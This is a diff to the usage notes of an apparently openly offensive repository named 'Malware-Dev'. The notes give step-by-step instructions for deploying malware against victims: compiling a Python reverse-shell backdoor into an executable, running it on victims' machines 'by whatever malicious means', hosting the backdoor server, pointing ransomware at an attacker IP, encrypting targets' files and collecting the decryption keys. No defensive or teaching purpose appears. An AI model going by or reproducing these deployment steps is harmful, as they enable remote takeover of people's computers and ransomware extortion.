@@ -79,12 +79,14 @@
 ## ============================================
 ## Usage
 ## Dependencies
-## bash install-modules.sh
+## cd Malware-Dev && sudo chmod 777 ./*.* && bash Malware-Dev/install-modules.sh;
 ##
 ## ============================================
 ## Backdoor
+## cd Malware-Dev/Backdoor => compile reverse_shell.py to reverse_shell.exe
+##
 ## Victims' machines:
-## Use your creativity to find the way to run code in reverse_shell.py
+## Use your creativity to find the way to run reverse_shell.exe or just the code in reverse_shell.py
 ##
 ## Backdoor Server:
 ## Use your creativity to host server.py in somewhere safe ;)
@@ -101,7 +103,7 @@
 ## https://usa.kaspersky.com/resource-center/threats/combating-antivirus
 ##
 ##
-## cd Unethical-Hacking-Tools &&
+## cd Malware-Dev/Ransomware &&
 ## Edit the listening server IP in server.py in line 11 
 ## to your attacker machine IP
 ## 
@@ -110,12 +112,12 @@
 ##
 ## On your victim's machine 
 ## Edit the IP_ADDRESS in line 109 to attacker's machine IP
-## run encryption.py code by whatever malicious means you can imagine
+## run encryption.exe comiled from encryption.py or just the encryption.py code by whatever malicious means you can imagine on your targets
 ## 
 ## Go back to your attacker's machine
 ## Check out encrypted_hosts.txt for decryption key
 ##
-## On victim's machine, run decryption.py code by whatever means
+## On victim's machine, run decryption.exe compiled from decryption.py or just the code in decryption.py by whatever means
 ## Enter the decryption key in 'encrypted_hosts.txt' 
 ## to decrypt the locked files
 ##
